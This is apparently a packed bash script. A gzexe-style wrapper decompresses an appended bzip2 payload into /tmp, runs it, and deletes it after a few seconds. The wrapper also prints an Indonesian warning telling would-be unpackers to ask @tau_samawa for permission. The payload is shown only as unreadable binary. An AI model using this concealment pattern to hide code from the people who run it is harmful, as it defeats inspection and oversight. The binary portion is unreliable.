#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��}>  ��� }���oޮ����    P���Vm�	D"h�i�4�M��jh�hMTlD� 4�     � D�'���6PѦ��d d�� h�h����a4h �d�I	�4��hh�L���4i�2 �4h�BAw��61�m�H�`O_�NjR@��c��|4�[Q2�"�XJo��y��9�`)���o�� p�މ��<,[4��(�S�u��B��q����Z8x�HΓU��''�cQhC���r"��~7��Q�%K̆V���Q��l��XTD۸D�m�髱j�UI#�{�C�Vx�@���U���;��E-q�|��AJ%5�N/',_��Θ����tq0�,����� <�b�$�H�R1��G���mG}���_ZX\ k��Ђ���9m�� ���!�����g�|���(���~�L��B{�,��g0�{�&�>��O��nX�ɀ��T-�R� �7�i�\�k��d�~K8�LL;u��S̉�A�i�IF5!��D -Pqv��S��A<��֠����Xb���Yƀ	�ǜ�GoR��b��5H�b۲��Z9�\�
��Dܡ6KH�>�@N���M�X�2�A�}x"Ōpk�G�3��#Xqyf��꫸�g[�* �m+�gw@� cճN�2����iܯ���kb����cm���, ��e5%�[4�yH6��u���8Dn�f���5cMQ��&�2����sR+"�/1 ��~���f���#�j�:C�MX-�r��<Z

�"��Rr�G��|�冕�a�I(��a�z7D;`Np�*=�"!V;��v��q]�xj����Y��\��E-Ez�+Ȟ�e�E�7�4�2�&����V@�i��\�
Z��7^ ���δ�V�p�MT�S�QN%�:�[7���7�$`��(7gz4,��Rc���<R'ۨ�4��R�b�U��K�$��HIg_�w$S�	
>G��